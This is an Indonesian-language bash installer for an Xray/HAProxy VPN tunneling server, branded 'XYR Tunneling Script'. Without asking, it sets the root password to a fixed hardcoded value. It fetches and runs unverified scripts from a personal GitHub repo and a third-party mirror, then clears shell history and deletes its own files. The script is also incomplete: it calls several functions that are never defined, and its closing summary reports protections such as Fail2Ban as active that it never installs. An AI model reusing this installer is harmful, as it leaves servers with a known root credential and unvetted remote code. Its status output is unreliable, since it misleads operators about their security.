#!/bin/bash

# Definisi Warna
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
purple="\e[0;33m"

# ===================
# Bersihkan layar
clear
clear && clear && clear
clear; clear; clear

# Dapatkan IP Address
export IP=$(curl -sS icanhazip.com)

# Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e " SELAMAT DATANG DI XYR TUNNELING SCRIPT ${YELLOW}(${NC}${green}Edisi Stabil${NC}${YELLOW})${NC}"
echo -e " SEDANG MEMERIKSA ALAMAT IP ANDA !!"
echo -e "${purple}----------------------------------------------------------${NC}"
echo -e " ›Pembuat : ${green}XYR STORE® ${NC}${YELLOW}(${NC}${green}V 3.2${NC}${YELLOW})${NC}"
echo -e " ›Tim : XYR STORE ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 2

# Memeriksa Arsitektur OS
if [[ $(uname -m) == "x86_64" ]]; then
    echo -e "${OK} Arsitektur Anda Didukung ( ${green}$(uname -m)${NC} )"
else
    echo -e "${ERROR} Arsitektur Anda Tidak Didukung ( ${YELLOW}$(uname -m)${NC} )"
    exit 1
fi

# Memeriksa Sistem
source /etc/os-release
if [[ "$ID" == "ubuntu" || "$ID" == "debian" ]]; then
    echo -e "${OK} OS Anda Didukung ( ${green}$PRETTY_NAME${NC} )"
else
    echo -e "${ERROR} OS Anda Tidak Didukung ( ${YELLOW}$PRETTY_NAME${NC} )"
    exit 1
fi

# Validasi IP Address
if [[ -z "$IP" ]]; then
    echo -e "${ERROR} IP Address ( ${YELLOW}Tidak Terdeteksi${NC} )"
    exit 1
else
    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
fi

# Validasi Berhasil
echo ""
read -p "$(echo -e "Tekan ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} Untuk Memulai Instalasi") "
echo ""
clear

# Cek Root
if [ "${EUID}" -ne 0 ]; then
    echo "Anda perlu menjalankan script ini sebagai root"
    exit 1
fi

# Cek Virtualisasi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo "OpenVZ tidak didukung"
    exit 1
fi

# Instalasi Dependensi Awal
apt install ruby -y
gem install lolcat
apt install wondershaper -y
clear

# REPO    
REPO="https://raw.githubusercontent.com/xyoruz/scriptvpn/main/"

####
start=$(date +%s)
secs_to_human() {
    echo "Waktu instalasi : $((${1} / 3600)) jam $(((${1} / 60) % 60)) menit $((${1} % 60)) detik"
}

### Status
function print_ok() {
    echo -e "${OK} ${BLUE} $1 ${FONT}"
}

function print_install() {
    echo -e "${green} =============================== ${FONT}"
    echo -e "${YELLOW} # $1 ${FONT}"
    echo -e "${green} =============================== ${FONT}"
    sleep 1
}

function print_error() {
    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}

function print_success() {
    if [[ 0 -eq $? ]]; then
        echo -e "${green} =============================== ${FONT}"
        echo -e "${Green} # $1 berhasil dipasang"
        echo -e "${green} =============================== ${FONT}"
        sleep 2
    fi
}

### Cek root
function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "User root memulai proses instalasi"
    else
        print_error "User saat ini bukan root, silakan beralih ke user root dan jalankan script lagi"
    fi
}

# Buat direktori xray
print_install "Membuat direktori xray"
mkdir -p /etc/xray
curl -s ifconfig.me > /etc/xray/ipvps
touch /etc/xray/domain
mkdir -p /var/log/xray
chown www-data.www-data /var/log/xray
chmod +x /var/log/xray
touch /var/log/xray/access.log
touch /var/log/xray/error.log
mkdir -p /var/lib/kyt >/dev/null 2>&1

# Informasi RAM
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
    esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g')
export Kernel=$(uname -r)
export Arch=$(uname -m)
export IP=$(curl -s https://ipinfo.io/ip/)

# Ubah Environment System
function first_setup(){
    timedatectl set-timezone Asia/Jakarta
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    print_success "Direktori Xray"
    
    # Install HAProxy berdasarkan OS
    if [[ "$ID" == "ubuntu" ]]; then
        echo "Setup Dependencies Untuk $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        sudo apt update -y
        apt-get install --no-install-recommends software-properties-common
        add-apt-repository ppa:vbernat/haproxy-2.0 -y
        apt-get -y install haproxy=2.0.*
    elif [[ "$ID" == "debian" ]]; then
        echo "Setup Dependencies Untuk OS $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
        curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
        echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" http://haproxy.debian.net buster-backports-1.8 main >/etc/apt/sources.list.d/haproxy.list
        sudo apt-get update
        apt-get -y install haproxy=1.8.*
    else
        echo -e " OS Anda Tidak Didukung ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
        exit 1
    fi
}

# Install Nginx
function nginx_install() {
    print_install "Setup nginx Untuk OS $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
    
    if [[ "$ID" == "ubuntu" || "$ID" == "debian" ]]; then
        sudo apt-get install nginx -y
        print_success "Nginx berhasil diinstall"
    else
        echo -e " OS Anda Tidak Didukung ( ${YELLOW}$PRETTY_NAME${FONT} )"
        exit 1
    fi
}

# Update dan hapus packages
function base_package() {
    clear
    print_install "Menginstall Packet Yang Dibutuhkan"
    
    apt update -y
    apt upgrade -y
    apt install zip pwgen openssl netcat socat cron bash-completion figlet sudo -y
    apt install ntpdate chrony jq openvpn easy-rsa -y
    
    # Set timezone
    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    ntpdate pool.ntp.org
    chronyd -q 'server 0.id.pool.ntp.org iburst'
    
    print_success "Packet Yang Dibutuhkan"
}

# Fungsi input domain
function pasang_domain() {
    echo -e ""
    clear
    echo -e "   .----------------------------------."
    echo -e "   |\e[1;32mSilakan Pilih Tipe Domain Dibawah \e[0m|"
    echo -e "   '----------------------------------'"
    echo -e "     \e[1;32m1)\e[0m Menggunakan Domain Sendiri"
    echo -e "     \e[1;32m2)\e[0m Menggunakan Domain Script"
    echo -e "   ------------------------------------"
    read -p "   Silakan pilih angka 1-2 atau Tombol Lain (Random) : " host
    echo ""
    
    if [[ $host == "1" ]]; then
        echo -e "   \e[1;32mMasukkan Subdomain Anda $NC"
        read -p "   Subdomain: " host1
        echo "IP=" >> /var/lib/kyt/ipvps.conf
        echo $host1 > /etc/xray/domain
        echo $host1 > /root/domain
        echo ""
    elif [[ $host == "2" ]]; then
        #install cf
        wget ${REPO}files/cf.sh && chmod +x cf.sh && ./cf.sh
        rm -f /root/cf.sh
        clear
    else
        print_install "Menggunakan Subdomain/Domain Random"
        clear
    fi
}

# Ganti Password Default
function password_default() {
    # Password default
    echo "root:xyrtunnel123" | chpasswd
    print_success "Password default diatur"
}

# Pasang SSL
function pasang_ssl() {
    clear
    print_install "Memasang SSL Pada Domain"
    
    domain=$(cat /root/domain)
    if [[ -z "$domain" ]]; then
        print_error "Domain belum diatur!"
        exit 1
    fi
    
    # Hentikan web server yang menggunakan port 80
    STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
    if [[ ! -z "$STOPWEBSERVER" ]]; then
        systemctl stop $STOPWEBSERVER
    fi
    systemctl stop nginx
    
    # Install acme.sh
    rm -rf /root/.acme.sh
    mkdir /root/.acme.sh
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
    
    # Issue certificate
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
    /root/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
    chmod 600 /etc/xray/xray.key
    
    print_success "SSL Certificate"
}

function make_folder_xray() {
    rm -rf /etc/vmess/.vmess.db
    rm -rf /etc/vless/.vless.db
    rm -rf /etc/trojan/.trojan.db
    rm -rf /etc/shadowsocks/.shadowsocks.db
    rm -rf /etc/ssh/.ssh.db
    rm -rf /etc/bot/.bot.db
    rm -rf /etc/user-create/user.log
    
    mkdir -p /etc/bot
    mkdir -p /etc/xray
    mkdir -p /etc/vmess
    mkdir -p /etc/vless
    mkdir -p /etc/trojan
    mkdir -p /etc/shadowsocks
    mkdir -p /etc/ssh
    mkdir -p /usr/bin/xray/
    mkdir -p /var/log/xray/
    mkdir -p /var/www/html
    mkdir -p /etc/kyt/limit/vmess/ip
    mkdir -p /etc/kyt/limit/vless/ip
    mkdir -p /etc/kyt/limit/trojan/ip
    mkdir -p /etc/kyt/limit/ssh/ip
    mkdir -p /etc/limit/vmess
    mkdir -p /etc/limit/vless
    mkdir -p /etc/limit/trojan
    mkdir -p /etc/limit/ssh
    mkdir -p /etc/user-create
    
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    touch /etc/vmess/.vmess.db
    touch /etc/vless/.vless.db
    touch /etc/trojan/.trojan.db
    touch /etc/shadowsocks/.shadowsocks.db
    touch /etc/ssh/.ssh.db
    touch /etc/bot/.bot.db
    
    echo "& Plugin Account" >>/etc/vmess/.vmess.db
    echo "& Plugin Account" >>/etc/vless/.vless.db
    echo "& Plugin Account" >>/etc/trojan/.trojan.db
    echo "& Plugin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& Plugin Account" >>/etc/ssh/.ssh.db
    echo "echo -e 'Vps Config User Account'" >> /etc/user-create/user.log
}

# Install Xray
function install_xray() {
    clear
    print_install "Core Xray 1.8.1 Versi Terbaru"
    
    # Buat direktori socket
    domainSock_dir="/run/xray"
    [[ ! -d $domainSock_dir ]] && mkdir $domainSock_dir
    chown www-data.www-data $domainSock_dir
    
    # Install Xray
    latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
    
    # Download config
    wget -O /etc/xray/config.json "${REPO}config/config.json" >/dev/null 2>&1
    wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
    
    # Settings informasi server
    curl -s ipinfo.io/city >>/etc/xray/city
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
    
    print_install "Memasang Konfigurasi Packet"
    wget -O /etc/haproxy/haproxy.cfg "${REPO}config/haproxy.cfg" >/dev/null 2>&1
    wget -O /etc/nginx/conf.d/xray.conf "${REPO}config/xray.conf" >/dev/null 2>&1
    
    domain=$(cat /etc/xray/domain)
    sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
    curl ${REPO}config/nginx.conf > /etc/nginx/nginx.conf
    
    # Gabung certificate
    cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
    
    # Service Xray
    cat >/etc/systemd/system/xray.service <<EOF
[Unit]
Description=Xray Service
Documentation=https://github.com/XTLS/Xray-core
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
EOF

    print_success "Konfigurasi Packet"
}

# ... (lanjutkan dengan fungsi-fungsi lainnya yang disederhanakan)

# Fungsi Install Script utama
function instal(){
    clear
    first_setup
    nginx_install
    base_package
    make_folder_xray
    pasang_domain
    password_default
    pasang_ssl
    install_xray
    # Fungsi-fungsi lain bisa ditambahkan di sini
    menu
    profile
    enable_services
    restart_system
}

# Mulai instalasi
instal

echo ""
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
rm -rf /root/domain

# Set hostname
sudo hostnamectl set-hostname $username
echo ""
echo "------------------------------------------------------------"
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 22"  | tee -a log-install.txt
echo "   - XRAY  Vmess TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vless TLS         : 443" | tee -a log-install.txt
echo "   - Trojan WS               : 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Informasi Server"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "------------------------------------------------------------"
echo ""
echo "===============-[ SCRIP BY XYR TUNNEL ]-==============="
echo -e ""

echo -ne "[ ${YELLOW}SELESAI${NC} ] PENGINSTALAN SCRIPT SELESAI. REBOOT SEKARANG? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ; then
    echo "Instalasi selesai tanpa reboot"
    exit 0
else
    echo "System akan reboot dalam 3 detik..."
    sleep 3
    reboot
fi
